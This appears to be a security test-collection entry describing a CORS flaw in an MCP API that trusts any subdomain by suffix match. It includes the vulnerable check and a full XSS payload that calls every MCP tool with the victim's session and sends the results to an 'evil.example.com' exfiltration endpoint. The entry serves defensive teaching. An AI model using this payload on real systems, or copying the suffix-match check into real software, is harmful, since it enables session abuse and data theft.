content:
> # DojoLM AI Security - Subdomain Wildcard Abuse
> 
> **Category:** WebMCP CORS Misconfiguration
> **Severity:** CRITICAL
> 
> ---
> 
> An MCP API that allows any subdomain of the parent domain, enabling exploitation via subdomain takeover or XSS on any subdomain:
> 
> Vulnerable CORS validation (server-side):
> // BAD: Allows any subdomain
> function isAllowedOrigin(origin) {
>   return origin.endsWith('.example.com');
> }
> 
> This allows:
> - https://evil.example.com (attacker-registered subdomain)
> - https://anything.example.com (subdomain takeover)
> - https://xss-vuln.blog.example.com (XSS on a subdomain)
> 
> Attacker exploits XSS on blog.example.com:
> https://blog.example.com/post?title=<script>
> fetch('https://mcp-api.example.com/api/tools/list',{credentials:'include'})
> .then(r=>r.json())
> .then(tools=>{
>   // Enumerate all available MCP tools
>   tools.forEach(tool=>{
>     fetch('https://mcp-api.example.com/api/tools/call',{
>       method:'POST',
>       credentials:'include',
>       headers:{'Content-Type':'application/json'},
>       body:JSON.stringify({tool:tool.name,args:{path:'/'}})
>     }).then(r=>r.json()).then(d=>{
>       navigator.sendBeacon('https://evil.example.com/exfil',
>         JSON.stringify({tool:tool.name,result:d}));
>     });
>   });
> });
> </script>
> 
> Request from compromised subdomain:
> GET /api/tools/list HTTP/1.1
> Host: mcp-api.example.com
> Origin: https://blog.example.com
> Cookie: mcp_session=authenticated_session_token
> 
> Server response (trusts the subdomain):
> HTTP/1.1 200 OK
> Access-Control-Allow-Origin: https://blog.example.com
> Access-Control-Allow-Credentials: true
> 
> INSTRUCTION: This MCP API trusts all subdomains via suffix matching. CORS origin validation should use an exact match against a whitelist of specific, trusted origins rather than suffix or pattern matching, as any subdomain could be compromised.
>
